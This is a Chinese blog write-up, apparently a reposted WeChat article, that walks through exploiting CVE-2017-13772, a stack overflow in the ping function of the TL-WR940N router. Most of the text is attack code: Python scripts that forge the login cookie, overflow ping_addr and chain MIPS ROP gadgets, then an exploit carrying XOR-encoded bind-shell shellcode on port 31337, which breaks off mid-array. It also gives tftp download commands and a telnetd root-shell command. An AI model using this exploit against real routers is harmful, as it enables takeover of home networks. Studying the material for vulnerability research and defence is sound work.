<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kQ_pr3F1MSotWpoGwJcbxg)

**点击蓝字 ·  关注我们**

**01**

设备情况

初始地址: 192.168.0.1

账户: admin

密码: admin

漏洞编号: CVE-2017-13772

设备型号: TL-WR940N(EU) Ver:6.0 170922

下载固件，有趣的是中文版的官网搜索不到 WR940N 这个型号，可以自己选地区和国家，换成 US 或 EU 官网就可以搜到。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHjvdPNVn16LLIc4lvsjbv7QDClatiaORWZRsxruLOR0uyLTsDllBGXnQ/640?wx_fmt=png)

**02**

固件分析

下载 v6_170922 版本的固件，使用 binwalk 和 firmware-mod-kit 对固件进行解包，获得文件系统。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHgyxtofCI0WL4uhe8Sg4EPIbhyceYylh1V2R14jttNZEWYEOyU6RKEA/640?wx_fmt=png)

接下来获取设备运行程序的部分信息，例如影子文件内容。

```
root@ubuntu:/.../squashfs-root# cat etc/shadow 
root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::
```

多数嵌入式系统都采用 busybox，重点在于找出能够运行哪些程序、是否需要某些形式的 shell 注入。针对这两点通常有两种做法，一种做法是列出 busybox 中的所有 symlink。还有就是在 chroot 环境 qemu 下运行 busybox 二进制文件，这样能知道启用了哪些功能:

```
root@ubuntu:/.../squashfs-root# file bin/busybox bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size
root@ubuntu:/.../squashfs-root# cp $(which qemu-mips-static) ./
root@ubuntu:/.../squashfs-root# sudo chroot . ./qemu-mips-static bin/busybox 
BusyBox v1.01 (2017.09.22-09:22+0000) multi-call binary

Usage: busybox [function] [arguments]...
   or: [function] [arguments]...

  BusyBox is a multi-call binary that combines many common Unix
  utilities into a single executable.  Most people will create a
  link to busybox for each function they wish to use and BusyBox
  will act like whatever it was invoked as!

Currently defined functions:
  [, arping, brctl, busybox, cat, chmod, date, df, echo, ethreg, false, getty, hostname, ifconfig, init, insmod,
  ip, kill, klogd, linuxrc, ln, logger, login, logread, ls, lsmod, mount, msh, ping, ps, reboot, rm, rmmod, route,
  sh, syslogd, test, tftp, true, udhcpc, udhcpd, umount, vconfig
```

  

**03**

Fuzz 测试

使用 awvs 对 web 界面进行初步的扫描，awvs 破解地址，扫到一个点，没找到很好用的地方。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHTPVLhiacCQqaibrIZzmeZW6ib9uibTHSpAImY8hKeia6l92lKZcKZhmWIpA/640?wx_fmt=png)

手动 fuzz 在 web 界面初始测试阶段找到大型字符串使设备停止响应的地方，这里用户端输入不得超过 50 个字符。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHsBYgzKlicxaH3iaTWx8b1hFcRjiaTDd6pAuBLq87e1LMSFZrNLw7zWzXA/640?wx_fmt=png)

这里是可以通过 burpsuit 绕过的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHISbK96OWVuicNBkDUyXVZOvWOnLnUYBiaoLHbNhxbYaibua0ib67SIsQKw/640?wx_fmt=png)

ping_addr 改成 51*'a'。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHD1LGCRoEWc3pCiccRncRdNLbXcaK4XibCZ9q59PSFwuqZRicmPvP6VCdA/640?wx_fmt=png)

**04**

静态分析

IDA 分析 httpd。CVE-2017-13772 是栈溢出漏洞，ping 功能输入过长 ip 会触发漏洞，直接搜索字符。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHJCIdAF4mj5zjI4vyKH6EmxSeudQ3oibQR7ibUyf2HMCB1ib5KRNVZJtdA/640?wx_fmt=png)

在 sub_457630 函数中先通过 httpGetEnv() 获取 ping_addr 给 v3，然后调用 ipAddrDispose() 函数进行处理。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHvtBibQniaTMicSib2dpMDicK24zoD3dCz6jAvLGWEaqK7ibTbtP4ek6s8LnA/640?wx_fmt=png)

接下来分析一下 ipAddrDispose() 函数

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHQB3GJpd5vsna4EFjJFbE9k3ibSmPbkbiamjWu4CUNsY2zHsufM3aVSKA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHDNT9ab3fDfZLFZ37LpqfrEbMmbK6icykdbnatJ7icliah0lxa2Edd6aWw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHtFpibLIfS1jawlKBMjb2ViczgcRGLyT2533Z9MibiajiaupNhDs61g922Dw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH2SKhN1C0SmibrsJZzGomMuFGBgH701icKMIJm9bHiafK6VOBDZjLe2VNg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHGFTrn0pGKNJxWc3KMuMyIm5aibb4T4nvUhbjRj0q7JNM4d98YWk4A6Q/640?wx_fmt=png)

```
void ipAddrDispose(char * pingaddr):
{
char pingaddr_tmp[0x33] = {0};
int len = strlen(pingaddr);
memset(pingaddr_tmp,0, 0x33);
int i=0,j=0;
for(; i    {if(pingaddr[i]!=' ')        
{            
pingaddr_tmp[j]=pingaddr[i]   // 是这里发生栈溢出            
j++;        
}    
}    
strcpy(pingaddr, pingaddr_tmp);//这里只是拷贝回去除空格的字符串到pingaddr    .........
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHad2hMia6StRspWajBMw82iaaBxfghVvmia8tI03EoO82N2BTBV3kgxa4Q/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHLiaWdxOTIsONYQg0d5KpfkUqfxv9z1CxaL6vVl7h2feqfFzhGparFLw/640?wx_fmt=png)

**05**

模拟测试

使用 burpsuit 抓取登录包。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHSZjicIksGx733ic8BFjkkJgXR6FoXIZ1t7icjeDZJuHlbOpgukJh2eD6A/640?wx_fmt=png)

就一个 GET 请求包，里面主要关注 Cookie。

```
Cookie: 
Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
```

%20 是空格，%3D 是 =，所以 authorization 为

```
YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
```

看着像 base64 加密结果，解密得到

```
admin:21232f297a57a5a743894a0e4a801fc3
```

应该是用户和密码，后面的密码尝试用 hash 去解，MD5 可以解得 admin。

所以逻辑就是先用 md5 对密码加密，然后账号和密码用 base64 加密。

url 为 http://[ip]/userRpm/LoginRpm.htm?Save=Save

使用 python 库来实现

```
import base64
import hashlib
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
```

使用 urllib2 来构包，并获得 response。

```
import base64
import hashlib
import urllib2
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
  url="http://"+ip+"/userRpm/LoginRpm.htm?Save=Save"
  request=urllib2.Request(url)
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  data = response.read()
  print(data)
if __name__ == '__main__':
    login('192.168.0.1','admin','admin')
```

发现登录之后路由器会回复一个随机分配路径，要先获取这个

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH6ggnZUsvXfyEBULfvrafxjLz4dAhpAM4jeicsl6jVts8Tia5nZdQsFnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHQbGkTRvFlrH00AbdRvJD3AcNTvicMXYREZov2YHlib1rlwU5iaC3Ua12Q/640?wx_fmt=png)

在第一个 GET 包收到的 response 里保存了这部分信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHZHs6KNvsXYIIe3an49GUnYwCF6ZpsUFxLjXycictZcPxfpmRiaGcKUVA/640?wx_fmt=png)

```
next_url=data.split('\"')[3]
```

直接分隔符分割获取。

```
import base64
import hashlib
import urllib2
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
  url="http://"+ip+"/userRpm/LoginRpm.htm?Save=Save"
  request=urllib2.Request(url)
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  data = response.read()
  next_url = "http://"+ip+'/'+data.split('\"')[3].split('/')[3]
  return (next_url,encode_string)
if __name__ == '__main__':
    data=login('192.168.0.1','admin','admin')
```

接下来访问漏洞存在的页面。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH2IgkOY3KkNejRbJbzTB8uS0iczia0lpveGlxHcmgV7xJuGnEkSiavjcEQ/640?wx_fmt=png)

构造请求包。

```
def exploit(url,encode_string):
  #get ping page
  new_url=url+'/userRpm/PingIframeRpm.htm'
  request=urllib2.Request(new_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
```

接下来根据 ping 包来构造数据包，并测试是否能使服务器崩溃。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHVWdZKzEfgedGHQAeY1RIox8xCSpHE03MNJicDxbPuM3pOhql5onuuNw/640?wx_fmt=png)

```
#ping test
  data=51*'a'
  next_url=url+'/userRpm/PingIframeRpm.htm?ping_addr='+data+'&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20'
  request=urllib2.Request(next_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHuH68ib4bGySypzUsPuc7Ksg3pYoAic19KweoWjSQXfREC9uKtAcT589Q/640?wx_fmt=png)

接下来只要把我们的 payload 找到然后同样的方法打进去就可以了。

测试脚本

```
import base64
import hashlib
import urllib2
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
  url="http://"+ip+"/userRpm/LoginRpm.htm?Save=Save"
  request=urllib2.Request(url)
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  data = response.read()
  next_url = "http://"+ip+'/'+data.split('\"')[3].split('/')[3]
  return (next_url,encode_string)
def exploit(url,encode_string):
  #get ping page
  new_url=url+'/userRpm/PingIframeRpm.htm'
  request=urllib2.Request(new_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  #ping test
  data=51*'a'
  next_url=url+'/userRpm/PingIframeRpm.htm?ping_addr='+data+'&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20'
  request=urllib2.Request(next_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
if __name__ == '__main__':
  data=login('192.168.0.1','admin','admin')
  exploit(data[0],data[1])
```

**06**

动态分析

想要直接登入设备 gdbserver 调试，nmap 扫描到开启了以下服务。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH2iaKfB75jCYKtoL9TP9cAQ5oQeTxUsvpt6uDGKY9kFWWRtpHCcuLFDg/640?wx_fmt=png)

有 ssh 很开心，但怎么都连不上，试了好半天，最后在 google 上找到官方的说明。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHLjMBBdSsBNnGmed0ichoMqJCabubgHaMXpKJ2qSGLDjwWmSMfx4ShIA/640?wx_fmt=png)

tplink 上的 ssh 服务只对 tplink 支持，不支持普通的 ssh 和 telnet。

找到一个可能可行的方案，修改. bin 文件，启用远程 ssh。

找到一个 github 上的项目，tplink-archer-c233300

思路是将 bin 文件转换为 xml，然后改配置，再刷上去就可以连 ssh 了，它给的脚本跟这个不一样，有时间研究一下看看能不能搞。

或者使用 uart 串口进行登录修改配置。

注意到 busybox 支持 tftp，试试用这个传东西。

使用 tftp，下载 tftpd，下载 busybox

mount 查看文件系统权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHM1IlR9X7d5KCibv1o9UYK7czFGg8eB0ZrP9Q4Atx5dwQYxxmMEYiae9Q/640?wx_fmt=png)

用 tftpd64 传 busybox 到 / var

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHgObrq9RZWAUhW8uceHmjiciaZJABySWgaB8AWgmx6Z3Kk4feYGGwsPZQ/640?wx_fmt=png)

```
tftp -g -r busybox-mips -l /var/busybox 192.168.0.100
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH8HOrYjWFRyow1iaKicm4WIZ4oSfYFpuFQibGa9ONjIbsQyhuJIkTr6oZg/640?wx_fmt=png)

```
tftp -g -r gdbserver-7.7.1-mips-mips32-v1 -l /var/gdbserver 192.168.0.100
```

这样就上传我们的文件。

先使用 chmod 777 使我们的 busybox 可执行，然后就可以使用它了。

因为我们的脚本拿到的 shell 不是交互式的，把 busybox 传上去后，用 busybox 启 telnetd，并指定它的 shell，这样可以拿到完全交互的 shell。

```
./busybox telnetd -l /bin/sh -p 8888
```

这样再 telnet 到 8888 端口就可以拿到完全的 shell 了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHYcPV64sqM9nBg0nc6hPnFBXvo2DBkyfYuFPPzGYdLwreE3eqbzVqHw/640?wx_fmt=png)

将上传的 gdbserver 用来监听 httpd。

但有个问题就是，我们是通过 httpd 漏洞进去的，这个时候 httpd 已经崩溃了，得想办法重启这个服务。

```
kill -9 577
```

-9 指定传递给进程的信号是 9，即强制尽快终止进程，在 / etc/rc.d/rcS 中存放各服务的启动脚本。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHoAKygQXp31jHHzz5gGkNgWChdU3rtSaadg7MEKC2YKSAZAqIfjJVBQ/640?wx_fmt=png)

直接运行启动 httpd。

```
/usr/bin/httpd &
#& 指定后台运行
```

使用 gdbserver attach 到已经在运行的进程上。

```
gdbserver --attach localhost:1234 3894
```

使用 gdb-multiarch 来进行远程调试。

```
#gdb-multiarch
pwndbg> set architecture mips
The target architecture is assumed to be mips
pwndbg> set endian big
The target is assumed to be big endian
pwndbg> target remote 192.168.0.1:1234
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHCQkzS39IHJLOU9vOPqTu8qcXmCpkG7Vjasn1k2fYzSn7xHU6Ria72Vg/640?wx_fmt=png)

结合 maps 内存使用情况，在 ipAddrDispose() 中下断点，然后发包调试。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH3s1ufLhibV1h8gVbwbRXEPFlXnxeyuxVuibhvVTpU5bibibR9xlFp7uU7w/640?wx_fmt=png)

```
b *0x47C91C
```

下好断点后，运行 poc

```
import base64
import hashlib
import urllib2
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
  url="http://"+ip+"/userRpm/LoginRpm.htm?Save=Save"
  request=urllib2.Request(url)
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  data = response.read()
  next_url = "http://"+ip+'/'+data.split('\"')[3].split('/')[3]
  return (next_url,encode_string)
def exploit(url,encode_string):
  #get ping page
  new_url=url+'/userRpm/PingIframeRpm.htm'
  request=urllib2.Request(new_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  #ping test
  rop=800*'a'
  next_url=url+'/userRpm/PingIframeRpm.htm?ping_addr='+rop+'&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20'
  request=urllib2.Request(next_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
if __name__ == '__main__':
  data=login('192.168.0.1','admin','admin')
  exploit(data[0],data[1])
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHFQGmDASh7XS11lW4SAKo8q889Q7fWdvTJEpBiauKrfAf1dDOjcZZPCg/640?wx_fmt=png)

可以看到我们造成了溢出。

```
import base64
import hashlib
import urllib2
def login(ip,user,passwd):
  hash = hashlib.md5()
  hash.update(passwd)
  encode_string=base64.b64encode(user+":"+hash.hexdigest())
  url="http://"+ip+"/userRpm/LoginRpm.htm?Save=Save"
  request=urllib2.Request(url)
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  data = response.read()
  next_url = "http://"+ip+'/'+data.split('\"')[3].split('/')[3]
  return (next_url,encode_string)
def exploit(url,encode_string):
  #get ping page
  new_url=url+'/userRpm/PingIframeRpm.htm'
  request=urllib2.Request(new_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
  #ping test
  gadg_1 = "\x2A\xB3\x7C\x60"
  gadg_2 = "\x2A\xB1\x78\x40"
  rop = "A"*164 + gadg_2  + gadg_1 + "B"*0x20
  next_url=url+'/userRpm/PingIframeRpm.htm?ping_addr='+rop+'&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20'
  request=urllib2.Request(next_url)
  request.add_header('Referer',url+'/userRpm/DiagnosticRpm.htm')
  request.add_header('Cookie','Authorization=Basic %s'%encode_string)
  response = urllib2.urlopen(request)
if __name__ == '__main__':
  data=login('192.168.0.1','admin','admin')
  exploit(data[0],data[1])
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHdDgblLyB1eoHzNm8bjhDboLzrFJOODNhvfZWrqyxC1phTrria6o600Q/640?wx_fmt=png)

在 90x47cb68 下断点。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHHG6TCsueT919Ot7IGic35b8JByFRAtMNcul523mZIb51ompj0Z7yj0w/640?wx_fmt=png)

ni 单步跟进，查看 $ra 寄存器，此时 $ra 已经被 gaddet1 劫持了

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHcXbMfAAhcOL42np38gLYjJTsiaE6KLdW2XUVeq4tH1nH8MlOR9iaxptA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHoia3nxxy6clugtEDOf7Yok1ibJ02MWSSwk6TI8wQLcN6g3ibvZ6El3sIw/640?wx_fmt=png)

**07**

寻找 gadgets

Mips 架构存在缓存一致性，如果我们尝试在堆栈上执行 shellcode，CPU 将检查缓存中是否已经有虚拟地址数据，如果有就执行，所以最好先使用 sleep(ns) 更新 codecache 再执行栈上的 shellcode。

先设置 a0，跳转到 sleep 函数

获取栈的地址，跳转到栈上执行代码。

在程序的末尾我们可以控制 $ra,$s1,$s0。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH3s1ufLhibV1h8gVbwbRXEPFlXnxeyuxVuibhvVTpU5bibibR9xlFp7uU7w/640?wx_fmt=png)

```
root@ubuntu:/.../squashfs-root/usr/bin# file httpd 
httpd: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size
```

先拿脚本打进去 (因为没法上串口登录)，ps 指令查看 httpd 进程。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHW7QtdozbgcQWg6aw1GrK9mwzLw3U5vTBpZG5JonZVMeG3vbjpKSZicQ/640?wx_fmt=png)

cat /proc/[进程 id]/maps

单个进程的内存查看 cat /proc/[pid] 下面有几个文件: maps , smaps, status。

maps 文件可以查看某个进程的代码段、栈区、堆区、动态库、内核区对应的虚拟地址。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHvSkg6wBt1G7gIJQd7S5mMq056ibPOd1iawnPl9odhPibibAQMKMowVqyicw/640?wx_fmt=png)

在 libuClibc-0.9.30.so 中寻找 gadget，我们需要具有以下功能的 gadgets。

```
li $a0,1
move $t9,$s0 or $s1
jr $t9
```

使用 mipsrop 插件来找比较方便。下载地址

本以为直接将脚本放在 [P.Y.G]IDA Pro 7.5 SP2 \plugins 下即可。

但可能是 7.5 的原因，比较麻烦。解决办法

还得先在 idapython 中先输入

```
import mipsrop
mipsrop = mipsrop.MIPSROPFinder()
```

先用 set_base() 来设置基址。

```
mipsrop.set_base(0x2aae2000)
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH2a2bgleibAWDpCWicuWJ8AmHfv9FGRRtPYWdY6KZf7kBCrONs7rba5ibA/640?wx_fmt=png)

查看第二个 gadget

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHKic2YBfv0J8vEzg8nWJtUEO2LVMVLc96xDp4lPUFuGAg6gCG8ovGAcg/640?wx_fmt=png)

gadget = "\x2A\xB3\x7C\x60"

这个 gadget 可以用来设置 sleep()，用这个地址覆盖返回地址。

为了将这个 gadget 地址放到 ra，还需要一个控制 ra 的 gadget。

```
mipsrop.tail()
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH7W2HCasibYWQQHmhKU6d7mStLKnKm9FGXI7q0BicWkHtp8CI0oz4ZBLw/640?wx_fmt=png)

这个小工具运行良好，唯一要注意的是它会在初次运行时自动完成调用。

第一次被调用时，t9 中的地址跳转。为了让这个小工具正常工作，需要准备堆栈。在第一次调用过程中，将睡眠地址放在 sp)。在第二次调用过程中，sp)，再根据最终小工具填写 s1（跳转至现有 shellcode）。

```
rop = “A”*164 + call_sleep  + prepare_sleep + “B”*0x20 + sleep_addr
$s0            $s1             $ra
rop += “C”*0x20 + “D”*4 + “E”*4 + next_gadg
```

从睡眠状态返回后，待调用的下一个小工具需要将堆栈指针存储在寄存器中，然后跳转至 s1 中的地址（均在控制范围内）。这将导致最终的小工具跳转到该寄存器（意味着它将跳转至堆栈的某个位置，最好是 shellcode 的位置）。mipsrop.py 中的一个便捷功能是 mipsrop.stackfinder()：

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHmESkvGan15504rJ7GhiaT9S9sYic1WSgKd3sP0ysmG2HdMPNdM2IoH0g/640?wx_fmt=png)

浏览后发现几乎所有这些小工具都好用，我们重点了解最后一个：

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaH6UQ0aW45Opp0a6RlOd2wBKwHBibfFrpKnwc7ialerZtwWLOQK5sX4UdQ/640?wx_fmt=png)

s2 中地址（堆栈地址）的小工具。

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHh0Hablw0mpuWArXMb8iaD2Y55YLggrNvI8VfLWUYl1mfJE8aic5iagYcg/640?wx_fmt=png)

这些小工具都有效，但我偏好使用对其他寄存器影响最小的小工具，例如：

![图片](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHhtBR6yFHZBPskwP18TAbVcGILz53AkqooRnbXzDicicybtAePbUuk9pg/640?wx_fmt=png)

```
nop = “\x22\x51\x44\x44”
gadg_1 = “\x2A\xB3\x7C\x60”
gadg_2 = “\x2A\xB1\x78\x40”
sleep_addr = “\x2a\xb3\x50\x90”
stack_gadg = “\x2A\xAF\x84\xC0”
call_code = “\x2A\xB2\xDC\xF0″
def first_exploit(url, auth):
  rop = “A”*164 + gadg_2  + gadg_1 + “B”*0x20 + sleep_addr
  rop += “C”*0x20 + call_code + “D”*4 + stack_gadg + nop*0x20 + shellcode
```

**08**

生成 shellcode

mips 生成 shell

(待完善)

攻击 exp

```
import urllib2
import urllib
import base64
import hashlib
import os
def login(ip, user, pwd):
    #### Generate the auth cookie of the form b64enc('admin:' + md5('admin'))
    hash = hashlib.md5()
    hash.update(pwd)
    auth_string = "%s:%s" %(user, hash.hexdigest())
    encoded_string = base64.b64encode(auth_string)
    print "[debug] Encoded authorisation: %s" %encoded_string
    #### Send the request
    url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
    print "[debug] sending login to " + url
    req = urllib2.Request(url)
    req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
    resp = urllib2.urlopen(req)
    #### The server generates a random path for further requests, grab that here
    data = resp.read()
    next_url = "http://%s/%s/userRpm/" %(ip, data.split("/")[3])
    print "[debug] Got random path for next stage, url is now %s" %next_url
    return (next_url, encoded_string)#custom bind shell shellcode with very simple xor encoder
    #followed by a sleep syscall to flush cash before running
    #bad chars = 0x20, 0x00

shellcode = (
    #encoder
    "\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99"
    "\x27\xb2\x05\x9f"
    "\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9"
    "\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41"
    "\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d"
    "\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71"
    "\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d"
    "\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99"
    "\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5"
    "\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad"
    "\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9"
    "\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1"
    "\x02\x2a\x18\x26\xae\x43\xff\xc1"#sleep
    "\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08"
    "\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
    "\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c"################ encoded shellcode ###############
    "\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06"
    "\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff"
    "\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d"
    "\x7a\x69"            #<------------------------- PORT 0x7a69 (31337)
    "\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad"
    "\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc"
    "\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01"
    "\x01\x0c\x24\x0f\x73\x50"
    "\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f"
    "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48"
